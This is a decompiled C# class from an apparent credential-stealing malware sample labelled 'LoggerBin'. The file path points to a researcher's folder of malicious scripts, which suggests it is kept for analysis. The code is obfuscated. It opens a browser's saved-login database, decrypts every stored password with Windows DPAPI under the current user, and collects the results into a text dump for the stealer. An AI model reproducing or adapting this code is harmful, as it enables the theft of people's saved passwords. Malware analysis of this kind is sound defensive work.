// Decompiled with JetBrains decompiler
// Type: bg.qV
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using BH;
using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using VW1;

namespace bg
{
  internal static class qV
  {
    private static qV VHE;

    public static string nr()
    {
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        if (!Convert.ToBoolean(XWr.EnableBrowserRecovery))
          return w4.bx(666, w4.vY);
        string path = Interaction.Environ(w4.bx(4500, w4.vY)) + w4.bx(4528, w4.vY);
        if (!File.Exists(path))
          return w4.bx(686, w4.vY);
        Sh sh = new Sh(path);
        eN.bx((object) sh, w4.bx(4638, w4.vY), eN.mD);
        int num1 = mW.bx((object) sh, mW.Wt);
        int num2 = 0;
        int num3 = num1 - 1;
        for (int index = num2; index <= num3; ++index)
        {
          try
          {
            stringBuilder.AppendLine(w4.bx(4656, w4.vY) + e9.bx((object) sh, index, w4.bx(4670, w4.vY), e9.Lz));
            qV.JHP((object) stringBuilder, (object) (w4.bx(1176, w4.vY) + e9.bx((object) sh, index, w4.bx(4682, w4.vY), e9.Lz)));
            stringBuilder.AppendLine(w4.bx(1200, w4.vY) + Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(e9.bx((object) sh, index, w4.bx(4694, w4.vY), e9.Lz)), (byte[]) null, DataProtectionScope.CurrentUser)));
            stringBuilder.AppendLine(w4.bx(1270, w4.vY));
          }
          catch (Exception ex)
          {
          }
        }
        if (string.IsNullOrWhiteSpace(stringBuilder.ToString()))
          return w4.bx(934, w4.vY);
        int num4 = 0;
        if (!qV.jHy())
          goto label_12;
label_3:
        switch (num4)
        {
          default:
            XWr.IsPass = true;
            return stringBuilder.ToString();
        }
label_12:
        int num5;
        num4 = num5;
        goto label_3;
      }
      catch
      {
      }
      return w4.bx(686, w4.vY);
    }

    internal static object JHP([In] object obj0, [In] object obj1) => (object) ((StringBuilder) obj0).AppendLine((string) obj1);

    internal static bool jHy() => qV.VHE == null;

    internal static qV JH6() => qV.VHE;
  }
}
